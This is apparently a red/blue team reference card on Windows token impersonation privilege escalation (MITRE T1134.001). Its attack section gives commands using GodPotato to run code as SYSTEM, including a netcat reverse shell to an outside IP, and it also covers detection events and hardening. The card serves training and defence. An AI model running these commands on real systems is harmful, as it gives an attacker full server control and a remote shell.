# [PE-TOKEN-001]: Token Impersonation Privilege Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-001 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: Token Impersonation/Theft (T1134.001)](https://attack.mitre.org/techniques/T1134/001/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows Endpoint |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Windows processes run with an Access Token that defines their permissions. If an attacker has `SeImpersonatePrivilege` (common for Service Accounts like IIS, MSSQL), they can force a privileged process (SYSTEM) to authenticate to them (e.g., via Named Pipe). The attacker can then steal the SYSTEM token and impersonate it to run arbitrary commands.
- **Attack Surface:** Service Accounts (IIS AppPool, NetworkService).
- **Business Impact:** **Local System Compromise**. Turning a web shell into full server control.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
- **Tools:**
    - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
    - [GodPotato](https://github.com/BeichenDream/GodPotato)
    - [SweetPotato](https://github.com/CCob/SweetPotato)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Privileges**
```cmd
whoami /priv
# Look for SeImpersonatePrivilege
```

**Step 2: Exploit (GodPotato)**
Use a modern Potato exploit that abuses DCOM/RPC to trigger authentication.
```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
*Output: `nt authority\system`*

**Step 3: Interactive Shell**
```cmd
GodPotato.exe -cmd "nc.exe -e cmd.exe 10.10.10.10 443"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Endpoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4673 | Sensitive Privilege Use. Filter for `SeImpersonatePrivilege` usage by non-system processes (e.g., `w3wp.exe`). |
| **Sysmon** | 1 | Creation of processes with `integrityLevel` System by parent processes running as Network Service. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Service Accounts:** Do not grant `SeImpersonatePrivilege` to service accounts unless strictly necessary. Use **Virtual Accounts** or **Group Managed Service Accounts (gMSA)** with restricted rights.
*   **Patching:** Ensure the Spooler service is disabled if not needed (mitigates PrintSpoofer, though other RPC triggers exist).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001] (Web Shell)
> **Next Logical Step:** [CA-UNSC-001] (Dump LSASS)
